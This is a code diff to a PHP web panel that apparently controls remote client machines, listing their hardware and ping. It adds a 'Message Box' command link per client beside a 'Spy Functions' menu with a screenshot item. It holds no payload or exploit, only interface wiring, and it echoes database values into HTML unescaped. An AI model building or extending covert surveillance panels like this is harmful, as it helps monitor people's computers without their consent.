@@ -1,4 +1,5 @@
 <head>
+<link rel="stylesheet" type="text/css" href="css/msgbox.css">
 <script src="js/bootstrap-table.js"></script>
 <script src="js/bootstrap-table-contextmenu.js"></script>
 </head>
@@ -17,6 +18,7 @@
                 <th data-field='CPU'>Processor</th>
                 <th data-field='GPU'>Graphics Card</th>
                 <th data-field='ping'>Ping</th>
+                <th data-field='cmd'></th>
               </tr>
             </thead>
             <tbody>
@@ -33,12 +35,14 @@
                         <td>".$rows['ram']."</td>
                         <td>".$rows['processor']."</td>
                         <td>".$rows['gpu']."</td>
-                        <td>".$rows['ping']."</td>";
+                        <td>".$rows['ping']."</td>
+                        <td><a id ='msgbox".$rows['cid']."' data-fancybox data-type='iframe' data-src='/commands/msg.php?cid=".$rows['guid']."' href='javascript:;'></a></td>";
                 }
               } 
             ?>
             </tbody>
         </table>
+        <a id ='msgbox' data-fancybox data-type="iframe" data-src="/commands/msg.php" href="javascript:;"></a>
       </div>  
     </div>
   
@@ -51,9 +55,10 @@
     <div class="dropdown-divider"></div>
     <h3 class="dropdown-header">Communications</h3>
     <li data-item="msgbox"><a>Message Box</a></li>
+    
     <div class="dropdown-divider"></div>
     <h3 class="dropdown-header">Spy Functions</h3>
-    <li data-item="msgbox"><a>Take screenshot</a></li>
+    <li data-item="screenshot"><a>Take screenshot</a></li>
     </ul>  
 
     <script>
@@ -61,8 +66,8 @@
 		  $('#grid').bootstrapTable({
 			  contextMenu: '#context-menu',
 			  onContextMenuItem: function(row, $el){
-				  if($el.data("item") == "edit"){
-					  alert(row.cid);
+				  if($el.data("item") == "msgbox"){
+            document.getElementById("msgbox" + row.cid).click();
 				  }
 			  }
 		  });
